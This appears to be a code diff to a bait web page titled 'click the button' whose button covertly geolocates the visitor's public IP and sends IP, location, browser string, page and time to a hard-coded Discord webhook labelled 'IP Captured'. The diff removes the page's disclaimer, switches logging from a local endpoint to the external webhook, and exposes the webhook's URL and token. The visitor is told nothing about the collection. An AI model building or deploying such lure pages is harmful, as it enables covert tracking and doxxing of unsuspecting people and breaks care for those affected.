@@ -3,38 +3,11 @@
 <head>
     <title>click the button</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            text-align: center;
-        }
-        button {
-            padding: 12px 24px;
-            font-size: 16px;
-            background-color: #5865F2;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #4752C4;
-        }
-        #status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
-            display: none;
-        }
-        .disclaimer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #666;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
-        }
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
+        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #4752C4; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
     </style>
 </head>
 <body>
@@ -42,14 +15,11 @@
     <p>click the button below:</p>
     
     <button id="trackButton">Click Me</button>
-    
     <div id="status"></div>
     
-    <div class="disclaimer">
-        <p><strong>click the button for a funny suprise</p>
-    </div>
-
     <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
+        
         document.getElementById('trackButton').addEventListener('click', async function() {
             const button = this;
             const status = document.getElementById('status');
@@ -63,38 +33,56 @@
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
                 
-                const infoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const info = await infoResponse.json();
+                let city = 'Unknown', region = 'Unknown', country = 'Unknown';
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const locationData = await locationResponse.json();
+                    city = locationData.city || 'Unknown';
+                    region = locationData.region || 'Unknown';
+                    country = locationData.country_name || 'Unknown';
+                } catch (e) {
+                    console.log('Location API failed');
+                }
                 
-                const response = await fetch('/log-ip', {
+                const now = new Date();
+                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear().toString().slice(-2)}`;
+                let hours = now.getHours();
+                const ampm = hours >= 12 ? 'PM' : 'AM';
+                hours = hours % 12;
+                hours = hours ? hours : 12;
+                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
+                
+                const discordMessage = {
+                    content: `**== IP Captured ==**\n` +
+                             `**Public IP:** \`${ip}\`\n` +
+                             `**Location:** ${city}, ${region}, ${country}\n` +
+                             `**Time:** ${timeStr}\n` +
+                             `**Date:** ${dateStr}\n` +
+                             `**Browser:** ${navigator.userAgent.substring(0, 100)}\n` +
+                             `**Page:** ${window.location.href}\n` +
+                             `\`\`\`Click logged at: ${new Date().toISOString()}\`\`\``,
+                    username: "IP Logger"
+                };
+                
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        ip: ip,
-                        city: info.city || 'Unknown',
-                        region: info.region || 'Unknown',
-                        country: info.country_name || 'Unknown',
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                        page: window.location.href
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage)
                 });
                 
                 if (response.ok) {
-                    status.textContent = 'Ip Adress Request processed successfully!';
+                    status.textContent = 'IP logged successfully! Check Discord.';
                     status.style.color = '#4CAF50';
                     status.style.backgroundColor = '#E8F5E9';
                 } else {
-                    throw new Error('Server error');
+                    throw new Error('Discord error');
                 }
                 
             } catch (error) {
+                console.error('Error:', error);
                 status.textContent = 'An error occurred. Please try again.';
                 status.style.color = '#F44336';
                 status.style.backgroundColor = '#FFEBEE';
-                console.error('Error:', error);
             } finally {
                 button.disabled = false;
                 button.textContent = 'click me';
